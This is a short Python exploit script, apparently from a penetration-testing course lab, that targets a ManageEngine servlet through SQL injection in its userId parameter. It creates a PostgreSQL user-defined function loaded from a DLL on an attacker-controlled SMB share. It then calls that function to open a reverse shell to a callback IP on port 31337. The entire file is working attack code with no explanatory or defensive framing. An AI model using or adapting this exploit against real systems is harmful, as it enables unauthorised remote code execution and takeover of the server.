import requests
import time
import sys
import urllib3
import socket
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("Manage Engine SQLi to RCE Exploit - By Liam")
print("Method: PostgreSQL User Defined Function.\n")

HOST = "https://manageengine:8443"
ENDPOINT = "/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;"

URL = HOST + ENDPOINT

# Give us a shell back on our IP and Port
CALLBACK_IP = '192.168.45.221'
CALLBACK_PORT = 31337

def make_request(sql):
    print(f"[*] executing query: {sql}")
    url = URL + sql
    print(url)
    r = requests.get(url, verify=False)

def create_udf_function():
    sql = "CREATE OR REPLACE FUNCTION rev_shell(text,integer) RETURNS VOID AS $$\\\\192.168.45.221\\awae\\rce.dll$$, $$connect_back$$ language c strict;--"
    make_request(sql)

def trigger_udf_function():
    print("[+] launching reverse shell...")
    sql = f"select rev_shell($${CALLBACK_IP}$$, {CALLBACK_PORT});--"
    make_request(sql)

def main():
    create_udf_function()
    trigger_udf_function()

main()
